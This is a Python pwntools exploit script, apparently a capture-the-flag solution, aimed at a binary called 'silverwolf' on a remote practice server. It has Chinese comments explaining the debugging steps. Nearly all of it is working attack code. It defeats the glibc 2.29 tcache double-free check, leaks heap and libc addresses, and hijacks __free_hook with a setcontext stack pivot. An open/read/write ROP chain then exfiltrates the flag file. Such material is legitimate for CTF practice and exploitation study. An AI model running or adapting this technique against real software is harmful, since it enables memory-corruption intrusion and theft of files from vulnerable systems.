from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './silverwolf'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29002) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu19_64/libc-2.29.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(size):
    index = 0
    sla(b'Your choice: ',b'1')
    sla(b'Index: ',int2bytes(index))
    sla(b'Size: ',int2bytes(size))

def edit(content):
    index = 0
    sla(b'Your choice: ',b'2')
    sla(b':',int2bytes(index))
    sla(b'Content: ',content)

def show():
    index = 0
    sla(b'Your choice: ',b'3')
    sla(b':',int2bytes(index))


def delete():
    index = 0
    sla(b'Your choice: ',b'4')
    sla(b':',int2bytes(index))


#清空0x80大小的tcache
for i in range(7):
    add(0x78)
#这里一开始我为了方便使用的0x60大小的tcache但后来调试时候发现必须使用0x78的，具体说明见下面


#leak heap addr
add(0x78)
delete()
edit(b'a'*0x10) #绕过tcache double free的检测
delete()
show()
ru(b'Content: ')
heap_addr = uu64(ru(b'\n',drop=True))
log.success('heap_addr '+hex(heap_addr))


#alloc to tcache head
head = (heap_addr & 0xfffffffffffff000) - 0x1000
log.success('head_addr '+hex(head))
add(0x78)
edit(p64(head + 0x10))
add(0x78)
add(0x78)


#free head --> leak libc

# 把0x250大小的chunk->第36个count改为0xff即-1，然后就会直接进入unsorted_bin
payload = b'\x00'*0x23 + b'\07'
edit(payload)
delete()
show()
ru(b'Content: ')
libc_base = uu64(ru('\x7f',drop=False)[-6:]) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success('libc_base '+ hex(libc_base))
system_addr = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']


#setcontext
payload = b'\02'*0x40 #所有tcache的count变成2
payload += p64(free_hook) + p64(0)   #0x20 tcache填充free_hook
payload += p64(head + 0x1000) 		 #flag 0x40
payload += p64(head + 0x2000) 		 #stack 0x50
payload += p64(head + 0x20a0) 		 #stack 0x60
payload += p64(head + 0x3000) 		 #orw 0x70
payload += p64(head + 0x3000 + 0x60) #orw 0x80
#注意这里payload的size大小为0x78，之前我一直忽视了edit函数中还有size的限制
#所以一开始就不可以使用0x50大小的chunk而是使用0x78大小的chunk
edit(payload)


pop_rdi_ret = libc_base + 0x026542
pop_rdx_ret = libc_base + 0x12bda6
pop_rsi_ret = libc_base + 0x26f9e
pop_rax_ret = libc_base + 0x47cf8
ret = libc_base + 0x2535f
# magic_2_29_gadget = libc_base + 0x150550
magic_2_29_gadget = libc_base + 0x12be97
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
open_addr = libc_base + libc.sym['open']
syscall_addr = libc_base + libc.sym['syscall'] + 23
#这里如果直接用syscall函数有修改栈的操作，所以要直接用syscall语句
# 实际上这里不需要是syscall函数，其他函数中的syscall语句都可以
#比如 syscall = read_addr + 15
FLAG = head + 0x1000
setcontext = libc_base + libc.sym['setcontext'] + 53 #将[rdi+0xa0[传入rsp


orw = p64(pop_rdi_ret) + p64(FLAG)#文件名
orw += p64(pop_rsi_ret) + p64(0)#以读方式打开
orw += p64(pop_rax_ret) + p64(constants.SYS_open)#系统调用号
orw += p64(syscall_addr)
#查看libc中open函数，前面存在操作栈的语句，故不能直接用，要自己通过系统调用

orw += p64(pop_rdi_ret) + p64(0x3)#打开的文件句柄
orw += p64(pop_rsi_ret) + p64(head + 0x3000)#保存的缓冲区
orw += p64(pop_rdx_ret) + p64(0x20)#长短
orw += p64(read_addr)

orw += p64(pop_rdi_ret) + p64(0x1)#标准输出流
orw += p64(pop_rsi_ret) + p64(head + 0x3000)#保存的缓冲区
orw += p64(pop_rdx_ret) + p64(0x20)#长短
orw += p64(write_addr)#实际上rsi和rdx设不设置都可以，因为上面read用完后并没有发生改变

# gdb.attach(p,'b '+ str(setcontext))
# pause()

add(0x18) #free_hook-->2.29_gadget
edit(p64(magic_2_29_gadget))
add(0x38) #flag
edit(b'./flag\x00\x00')
add(0x68) #orw 1
edit(orw[:0x60])
add(0x78) #orw 2
edit(orw[0x60:])
add(0x58) #rsp 2
edit(p64(head + 0x3000) + p64(ret))
#注意看这里还要加上一个ret，原因是setcontext中会push rcx，rcx的值又是rdx+0xa8
#setcontext执行完毕后会执行ret rcx，需要把push降低的栈给拉回来，故需要加上ret

# ropper --file libc.so.6 --search “mov rdx”
# mov rdx, qword ptr [rdi + 8]
# mov rax, qword ptr [rdi]
# mov rdi, rdx
# jmp rax
add(0x48) #rsp 1
payload = p64(setcontext) + p64(head + 0x2000)
#这里先通过gadget把rsp 1的地址赋给rdx，把setcontext的值赋给 rax，再jmp rax
edit(payload)
#触发free_hook
delete()
itr()
# end

